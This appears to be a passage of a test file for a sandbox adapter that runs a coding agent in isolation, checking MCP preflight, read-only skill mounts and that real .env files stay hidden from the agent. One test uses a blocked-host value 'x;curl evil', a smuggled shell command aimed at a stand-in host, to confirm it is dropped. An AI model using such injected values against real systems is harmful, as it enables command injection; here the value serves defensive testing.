  it("rootEnvFiles lists env files at a folder's top, skipping *.example", async () => {
    const { rootEnvFiles } = await import("../../../src/sandbox/sbx/adapter.ts");
    const d = mkdtempSync(join(tmpdir(), "sbx-envfiles-"));
    try {
      for (const f of [".env", ".envrc", ".env.local", ".env.example", "README.md"]) writeFileSync(join(d, f), "");
      expect(rootEnvFiles(d)).toEqual([".env", ".env.local", ".envrc"]);
      expect(rootEnvFiles(join(d, "missing"))).toEqual([]);
    } finally {
      rmSync(d, { recursive: true, force: true });
    }
  });

  it("allowHintLines checks hosts like inspect does: strips ports, drops unsafe hosts", async () => {
    const { allowHintLines } = await import("../../../src/sandbox/sbx/adapter.ts");
    const log = JSON.stringify({ blocked: [{ host: "a.example:443" }, { host: "a.example" }, { host: "x;curl evil" }] });
    expect(allowHintLines(log)).toEqual(["sbx policy allow network a.example", "(not shown: a blocked host with unexpected characters)"]);
    expect(allowHintLines("not json")).toBeUndefined();
    expect(allowHintLines(JSON.stringify({ blocked: [] }))).toEqual([]);
  });
});

describe("sbx adapter: static MCP servers (sandbox.sbx.mcp)", () => {
  it("createArgs passes --static-mcp with the configured names", () => {
    expect(createArgs("n", { kitDir: "/k", envAllow: [], mcp: ["atlassian", "notion"] }, ["/m"])).toEqual([
      "create", "--name", "n", "--no-progress", "--no-input", "--static-mcp", "atlassian,notion", "claude", "--kit", "/k", "/m",
    ]);
    expect(createArgs("n", { kitDir: "/k", envAllow: [] }, ["/m"])).not.toContain("--static-mcp");
  });

  const tmp = mkdtempSync(join(tmpdir(), "sbx-mcp-"));
  writeFileSync(join(tmp, "spec.yaml"), "name: kit\n");
  afterAll(() => rmSync(tmp, { recursive: true, force: true }));
  const R = "fandango/webtarsthree";
  const GOOD_EXEC = ok(`v24.3.0\ngit version 2.47.0\njq-1.7.1\ndl-step:direnv\n2.32.1\ndl-step:git\ndl-step:gh\n${R}\n`);
  const pf = (mcpLs: SbxResult) => {
    const f = fakeRunner((args) => (args[0] === "mcp" ? mcpLs : args[0] === "exec" ? GOOD_EXEC : ok()));
    const p = makeSbxAdapter({ run: f.run, realpath: (p) => p, hostNodeMajor: 24, env: FULL_ENV }).preflight({
      repoRoot: "/abs/root",
      mounts: ["/abs/root"],
      cwd: "/abs/root",
      instanceName: "dl-12-webtarsthree-preflight-abc123",
      githubRepo: R,
      config: { kitDir: tmp, envAllow: [], mcp: ["atlassian"] },
    });
    return { p, f };
  };
  const ls = (servers: unknown) => ok(JSON.stringify(servers));

  it("passes when every configured server is registered and ready, checked before any sandbox is created", async () => {
    const { p, f } = pf(ls([{ name: "atlassian", status: "ready" }]));
    await expect(p).resolves.toBeUndefined();
    const first = f.calls.findIndex((c) => c.args[0] === "mcp");
    expect(f.calls[first].args).toEqual(["mcp", "ls", "--json"]);
    expect(first).toBeLessThan(f.calls.findIndex((c) => c.args[0] === "create"));
  });

  it("refuses an unregistered server, naming the add and auth commands", async () => {
    const { p, f } = pf(ls([]));
    await expect(p).rejects.toThrow(/MCP server "atlassian" is not registered with sbx: run sbx mcp add atlassian --url <url>, then sbx mcp auth atlassian/);
    expect(f.calls.some((c) => c.args[0] === "create")).toBe(false);
  });

  it("refuses a registered server that is not ready, naming its status and the auth command", async () => {
    await expect(pf(ls([{ name: "atlassian", status: "needs auth" }])).p).rejects.toThrow(
      /MCP server "atlassian" is "needs auth", not ready: run sbx mcp auth atlassian/,
    );
  });

  it("fails closed when sbx mcp ls can't be read", async () => {
    await expect(pf({ code: 1, stdout: "", stderr: "daemon down", timedOut: false }).p).rejects.toThrow(/sbx preflight failed \(sbx mcp ls\): daemon down/);
    await expect(pf(ok("not json")).p).rejects.toThrow(/sbx preflight failed \(sbx mcp ls\)/);
  });
});

describe("sbx adapter: atlassianMcp (gateway tool names)", () => {
  const a = makeSbxAdapter({ run: fakeRunner().run });
  it("with atlassian in sandbox.sbx.mcp, the agent sees the v2 tools under mcp-gateway", () => {
    expect(a.atlassianMcp?.(a.validateConfig({ kitDir: "/kit", mcp: ["atlassian"] }))).toEqual({ server: "mcp-gateway", naming: "v2" });
  });
  it("without it, no Atlassian tools are proxied: the host names stay (and are simply absent in the sandbox)", () => {
    expect(a.atlassianMcp?.(a.validateConfig({ kitDir: "/kit" }))).toBeUndefined();
    expect(a.atlassianMcp?.(a.validateConfig({ kitDir: "/kit", mcp: ["other"] }))).toBeUndefined();
  });
});

describe("sbx adapter: host skills (sandbox.sbx.hostSkills)", () => {
  const SKILLS = mkdtempSync(join(tmpdir(), "host-skills-"));
  mkdirSync(join(SKILLS, "push-branch"));
  writeFileSync(join(SKILLS, "push-branch", "SKILL.md"), "---\nname: push-branch\n---\n");
  afterAll(() => rmSync(SKILLS, { recursive: true, force: true }));
  const cfg = { ...CFG, hostSkills: ["push-branch"] };
  const adapter = (run = fakeRunner().run) => makeSbxAdapter({ run, hostSkillsDir: SKILLS, realpath: (p: string) => p });

  it("hostSkillPaths maps each skill to its read-only spot inside the sandbox; none when unset", () => {
    expect(adapter().hostSkillPaths?.(cfg)).toEqual({ "push-branch": "/home/agent/.dev-loop/skills/push-branch/SKILL.md" });
    expect(adapter().hostSkillPaths?.(CFG)).toEqual({});
  });

  it("hostPush is true: the loop signs and pushes on the host", () => {
    expect(adapter().hostPush?.(cfg)).toBe(true);
  });

  it("prepare mounts each host skill folder read-only at that spot", async () => {
    const f = fakeRunner();
    await adapter(f.run).prepare({ instanceName: N, mounts: ["/abs/root"], config: cfg });
    expect(f.calls[0].args.slice(-2)).toEqual(["/abs/root", `${join(SKILLS, "push-branch")}:/home/agent/.dev-loop/skills/push-branch:ro`]);
  });

  it("without hostSkills, prepare mounts nothing extra", async () => {
    const f = fakeRunner();
    await adapter(f.run).prepare({ instanceName: N, mounts: ["/abs/root"], config: CFG });
    expect(f.calls[0].args.at(-1)).toBe("/abs/root");
  });

  it("preflight refuses a listed skill with no SKILL.md on the host, naming the path", async () => {
    const a = makeSbxAdapter({ run: fakeRunner().run, hostSkillsDir: SKILLS, realpath: (p: string) => p, env: FULL_ENV, hostNodeMajor: 24 });
    const kit = mkdtempSync(join(tmpdir(), "kit-"));
    writeFileSync(join(kit, "kit.yaml"), "x");
    await expect(
      a.preflight({ repoRoot: "/abs/root", mounts: [], cwd: "/abs/root", instanceName: N, config: { ...CFG, kitDir: kit, hostSkills: ["missing-skill"] } }),
    ).rejects.toThrow(`sandbox.sbx.hostSkills: "missing-skill" has no SKILL.md at ${join(SKILLS, "missing-skill", "SKILL.md")}`);
    rmSync(kit, { recursive: true, force: true });
  });

  it("preflight checks each host skill is readable inside the test sandbox", async () => {
    const f = fakeRunner((args) => (args[0] === "exec" ? ok("dl-step:tools\nv24.1.0\n") : ok()));
    const a = makeSbxAdapter({ run: f.run, hostSkillsDir: SKILLS, realpath: (p: string) => p, env: FULL_ENV, hostNodeMajor: 24 });
    const kit = mkdtempSync(join(tmpdir(), "kit-"));
    writeFileSync(join(kit, "kit.yaml"), "x");
    await a.preflight({ repoRoot: "/abs/root", mounts: [], cwd: "/abs/root", instanceName: N, config: { ...CFG, kitDir: kit, hostSkills: ["push-branch"] } }).catch(() => {});
    const exec = f.calls.find((c) => c.args[0] === "exec");
    expect(exec?.args.at(-1)).toContain("test -r '/home/agent/.dev-loop/skills/push-branch/SKILL.md'");
    const create = f.calls.find((c) => c.args[0] === "create");
    expect(create?.args.at(-1)).toBe(`${join(SKILLS, "push-branch")}:/home/agent/.dev-loop/skills/push-branch:ro`);
    rmSync(kit, { recursive: true, force: true });
  });
});

describe("sbx adapter: the target repo's root (and its real env files) is never mounted", () => {
  const tmp = mkdtempSync(join(tmpdir(), "sbx-hide-"));
  const kit = join(tmp, "kit");
  mkdirSync(kit);
  writeFileSync(join(kit, "spec.yaml"), "name: kit\n");
  const root = join(tmp, "root");
  const repo = join(tmp, "repo");
  mkdirSync(root);
  mkdirSync(join(repo, ".claude", "worktrees"), { recursive: true });
  mkdirSync(join(repo, ".git"));
  writeFileSync(join(repo, ".envrc"), "export X=fake-test-value\n");
  writeFileSync(join(repo, ".env.local"), "X=fake-test-value\n");
  writeFileSync(join(repo, ".envrc.example"), "export X=placeholder\n");
  const fake = fakeEnvPaths(repo);
  writeFileSync(fake.envrc, `${FAKE_ENV_MARKER}\n`);
  afterAll(() => rmSync(tmp, { recursive: true, force: true }));

  const P = "dl-12-webtarsthree-preflight-abc123";
  const identity = (p: string) => p;
  const pctx = (repoDir: string | undefined = repo, mounts = [root, repo]) => ({
    repoRoot: root, mounts, cwd: root, instanceName: P, config: { kitDir: kit, envAllow: [] }, ...(repoDir ? { repoDir } : {}),
  });
  const SUB = [join(repo, ".git"), join(repo, ".claude", "worktrees")];
  const SETUP = `git config --global --add safe.directory '${repo}' && direnv allow '${fake.envrc}'`;
  const DIRENV = "v24.3.0\ngit version 2.47.0\njq-1.7.1\ndl-step:direnv\n2.32.1\n";
  const answer = (exec: SbxResult) => (args: string[]) => (args[0] === "exec" ? exec : ok());
  const pf = (exec: SbxResult) =>
    makeSbxAdapter({ run: fakeRunner(answer(exec)).run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: () => {} }).preflight(pctx());

  it("coverMounts swaps a cloned repo dir's mount for its .git and .claude/worktrees only", () => {
    expect(coverMounts([root, repo], repo)).toEqual([root, ...SUB]);
    expect(coverMounts([root, repo], undefined)).toEqual([root, repo]);
    const fresh = join(tmp, "fresh");
    expect(coverMounts([root, fresh], fresh)).toEqual([root, fresh]);
    // The v2 clone sits inside dev-loop's root: not its own mount, nothing to swap.
    expect(coverMounts([root], join(root, "clone"))).toEqual([root]);
  });

  it("prepare creates with the sub-mounts, then trusts the repo for git and allows the fake inside the sandbox", async () => {
    const f = fakeRunner();
    await makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: [root, repo], repoDir: repo, config: CFG });
    expect(f.calls[0].args.slice(-3)).toEqual([root, ...SUB]);
    expect(f.calls[0].args).not.toContain(repo);
    expect(f.calls[1].args).toEqual(["exec", N, "sh", "-c", SETUP]);
  });

  it("prepare: a failed setup removes the instance it created, then throws", async () => {
    const f = fakeRunner((a) => (a[0] === "exec" ? fail(1, "boom") : ok()));
    await expect(makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: [root, repo], repoDir: repo, config: CFG })).rejects.toThrow(
      "could not set up the robot's fake .envrc inside the sandbox: boom",
    );
    expect(f.calls.map((c) => c.args[0])).toEqual(["create", "exec", "rm"]);
    expect(f.calls[2].args).toEqual(["rm", "-f", N]);
  });

  it("prepare without repoDir is unchanged (one create, the repo mounted whole, no setup)", async () => {
    const f = fakeRunner();
    await makeSbxAdapter({ run: f.run }).prepare({ instanceName: N, mounts: [root, repo], config: CFG });
    expect(f.calls).toHaveLength(1);
    expect(f.calls[0].args.at(-1)).toBe(repo);
  });

  it("preflight: sub-mounts on create; the check sets up the fake, proves no env file (any case) is visible, then loads the fake", async () => {
    const f = fakeRunner(answer(ok(`${DIRENV}dl-step:allow\ndl-step:hidden\ndl-step:envrc\n`)));
    const warnings: string[] = [];
    await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV, warn: (m) => void warnings.push(m) }).preflight(pctx());
    expect(f.calls[0].args.slice(-2)).toEqual(SUB);
    const check = f.calls[1].args[4];
    expect(check).toContain(`echo dl-step:allow && ${SETUP}`);
    expect(check).toContain(`echo dl-step:hidden && ! ls -A '${repo}' | grep -qiE '^\\.env'`);
    expect(check).toContain(`test ! -e '${repo}/.ENVRC'`);
    expect(check).toContain(`echo dl-step:envrc && direnv exec '${repo}/.claude/worktrees' true`);
    expect(warnings).toEqual([]);
  });

  it("preflight: an env file showing through is refused", async () => {
    await expect(pf(fail(1, "", `${DIRENV}dl-step:allow\ndl-step:hidden\n`))).rejects.toThrow(
      "the target repo's real env files are visible inside the sandbox (its top folder should not be mounted); refusing to run the robot next to them",
    );
  });

  it("preflight: a failed setup, or a fake that won't load, names the loop's fake", async () => {
    await expect(pf(fail(1, "boom", `${DIRENV}dl-step:allow\n`))).rejects.toThrow("could not set up the robot's fake .envrc inside the sandbox: boom");
    await expect(pf(fail(1, "direnv: error x is blocked", `${DIRENV}dl-step:allow\ndl-step:hidden\ndl-step:envrc\n`))).rejects.toThrow(
      "the robot's fake .envrc does not load inside the sandbox: restart the loop (it rewrites the fake); see docs/sandbox-sbx.md",
    );
  });

  it("preflight: a never-cloned repo dir (no .git) has nothing to cover and is not refused", async () => {
    const fresh = join(tmp, "fresh2");
    const f = fakeRunner(answer(ok(DIRENV)));
    await makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(pctx(fresh, [root]));
    expect(f.calls[1].args[4]).not.toContain("dl-step:hidden");
  });

  it("preflight: an env file in a repo dir that can't be swapped out (inside dev-loop's root) is refused before any sbx call", async () => {
    const clone = join(root, "clone");
    mkdirSync(join(clone, ".git"), { recursive: true });
    mkdirSync(join(clone, ".claude", "worktrees"), { recursive: true });
    writeFileSync(fakeEnvPaths(clone).envrc, `${FAKE_ENV_MARKER}\n`);
    writeFileSync(join(clone, ".env"), "x");
    try {
      const f = fakeRunner();
      await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(pctx(clone, [root]))).rejects.toThrow(
        `.env is in ${clone}, which the sandbox can read (it is inside dev-loop's folder): remove it; the robot uses the fake env`,
      );
      expect(f.calls).toEqual([]);
    } finally {
      rmSync(clone, { recursive: true, force: true });
    }
  });

  it("refuses an env file in the app folder of a repo inside dev-loop's folder", async () => {
    const clone = join(root, "clone-app");
    mkdirSync(join(clone, ".git"), { recursive: true });
    mkdirSync(join(clone, "app"), { recursive: true });
    mkdirSync(join(clone, ".claude", "worktrees"), { recursive: true });
    writeFileSync(fakeEnvPaths(clone).envrc, `${FAKE_ENV_MARKER}\n`);
    writeFileSync(join(clone, "app", ".env.local"), "x");
    writeFileSync(join(clone, "app", ".env.example"), "x");
    try {
      const f = fakeRunner();
      await expect(
        makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight({ ...pctx(clone, [root]), appDir: "app" }),
      ).rejects.toThrow(/\.env\.local is in .*\/app, which the sandbox can read/);
      expect(f.calls).toEqual([]);
    } finally {
      rmSync(clone, { recursive: true, force: true });
    }
  });

  it("preflight: no fake on the host is refused before any sbx call", async () => {
    const bare = join(tmp, "bare");
    mkdirSync(join(bare, ".git"), { recursive: true });
    const f = fakeRunner();
    await expect(makeSbxAdapter({ run: f.run, realpath: identity, hostNodeMajor: 24, env: FULL_ENV }).preflight(pctx(bare, [root, bare]))).rejects.toThrow(
      `the robot's fake env is missing at ${bare}/.claude/worktrees/.envrc: the loop writes it at startup`,
    );
    expect(f.calls).toEqual([]);
  });
});
